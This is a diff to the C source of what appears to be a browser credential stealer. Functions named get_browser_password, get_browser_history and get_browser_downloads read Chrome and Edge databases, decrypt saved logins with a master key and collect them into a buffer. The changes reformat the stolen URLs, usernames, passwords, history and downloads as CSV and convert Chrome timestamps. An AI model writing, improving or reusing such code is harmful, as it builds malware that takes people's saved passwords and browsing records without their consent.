@@ -4,6 +4,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <time.h>
 #include "common.h"
 #include "client/utils.h"
 #include "client/browser_pass.h"
@@ -14,6 +15,22 @@
     "C:\\Users\\%USERNAME%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
 
 // "C:\\Users\\%USERNAME%\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data"
+
+char* to_formatted_time(const char* chrome_time_str) {
+    long long chrome_time = atoll(chrome_time_str);
+    time_t seconds_since_1601 = chrome_time / 1000000;
+    const time_t EPOCH_DIFF = 11644473600LL;
+    time_t unix_time = seconds_since_1601 - EPOCH_DIFF;
+
+    struct tm tm_info;
+    if (localtime_s(&tm_info, &unix_time) != 0) return NULL;
+
+    char* buffer = malloc(64);
+    if (!buffer) return NULL;
+
+    strftime(buffer, 64, "%Y-%m-%d %H:%M:%S", &tm_info);
+    return buffer;
+}
 
 char* get_master_key() {
     char path[MAX_PATH];
@@ -142,14 +159,15 @@ char* get_browser_password() {
     // Allocate a big buffer to return
     size_t out_size = 1024 * 1024;
     char* out = malloc(out_size);
-    size_t offset = 0;
     if (!out) {
         sqlite3_close(db);
         DeleteFileA(temp_db);
         free(master_key);
         return NULL;
     }
-    out[0] = '\0';
+    out[0] ='\0';
+    strcat(out, "URL,USER,PASS\n");
+    size_t offset = strlen(out);
 
     if (sqlite3_prepare_v2(db, sql, -1, &stmt, 0) == SQLITE_OK) {
         while (sqlite3_step(stmt) == SQLITE_ROW) {
@@ -167,7 +185,7 @@ char* get_browser_password() {
 
             // Append formatted line into output buffer
             int written = snprintf(out + offset, out_size - offset,
-                          "URL: %s\nUSER: %s\nPASS: %s\n\n",
+                          "%s,%s,%s\n",
                           url ? url : "", user ? user : "", password);
     
             if (written > 0 && (offset + written) < out_size) {
@@ -210,13 +228,14 @@ char* get_browser_history() {
     // Allocate a big buffer to return
     size_t out_size = 1024 * 1024;
     char* out = malloc(out_size);
-    size_t offset = 0;
     if (!out) {
         sqlite3_close(db);
         DeleteFileA(temp_db);
         return NULL;
     }
     out[0] = '\0';
+    strcat(out, "URL,TITLE,VISIT_COUNT,LAST_VISIT_TIME\n");
+    size_t offset = strlen(out);
 
     if (sqlite3_prepare_v2(db, sql, -1, &stmt, 0) == SQLITE_OK) {
         while (sqlite3_step(stmt) == SQLITE_ROW) {
@@ -225,15 +244,17 @@ char* get_browser_history() {
             const char* title = (const char*)sqlite3_column_text(stmt, 1);
             const char* visit_count = (const char*)sqlite3_column_text(stmt, 2);
             const char* last_visit_time = (const char*)sqlite3_column_text(stmt, 3);
+            const char* formatted_time = to_formatted_time(last_visit_time);
 
             // Append formatted line into output buffer
             int written = snprintf(out + offset, out_size - offset,
-                          "URL: %s\tTITLE: %s\tVISIT_COUNT: %s\tLAST_VISIT_TIME: %s\n",
-                          url ? url : "", title ? title : "", visit_count ? visit_count : "", last_visit_time ? last_visit_time : "");
+                          "%s,%s,%s,%s\n",
+                          url ? url : "", title ? title : "", visit_count ? visit_count : "", formatted_time ? formatted_time : "");
     
             if (written > 0 && (offset + written) < out_size) {
                 offset += written;
             }
+            free(formatted_time);
         }
 
         sqlite3_finalize(stmt);
@@ -270,13 +291,14 @@ char* get_browser_downloads() {
     // Allocate a big buffer to return
     size_t out_size = 1024 * 1024;
     char* out = malloc(out_size);
-    size_t offset = 0;
     if (!out) {
         sqlite3_close(db);
         DeleteFileA(temp_db);
         return NULL;
     }
     out[0] = '\0';
+    strcat(out, "TARGET_PATH,LAST_ACCESS_TIME,URL,MIME_TYPE\n");
+    size_t offset = strlen(out);
 
     if (sqlite3_prepare_v2(db, sql, -1, &stmt, 0) == SQLITE_OK) {
         while (sqlite3_step(stmt) == SQLITE_ROW) {
@@ -285,15 +307,17 @@ char* get_browser_downloads() {
             const char* last_access_time = (const char*)sqlite3_column_text(stmt, 1);
             const char* site_url = (const char*)sqlite3_column_text(stmt, 2);
             const char* mime_type = (const char*)sqlite3_column_text(stmt, 3);
+            const char* formatted_time = to_formatted_time(last_access_time);
 
             // Append formatted line into output buffer
             int written = snprintf(out + offset, out_size - offset,
-                          "TARGET: %s\tLAST_ACCESS_TIME: %s\tURL: %s\tMIME_TYPE: %s\n",
-                          target_path ? target_path : "", last_access_time ? last_access_time : "", site_url ? site_url : "", mime_type ? mime_type : "");
+                          "%s,%s,%s,%s\n",
+                          target_path ? target_path : "", formatted_time ? formatted_time : "", site_url ? site_url : "", mime_type ? mime_type : "");
     
             if (written > 0 && (offset + written) < out_size) {
                 offset += written;
             }
+            free(formatted_time);
         }
 
         sqlite3_finalize(stmt);
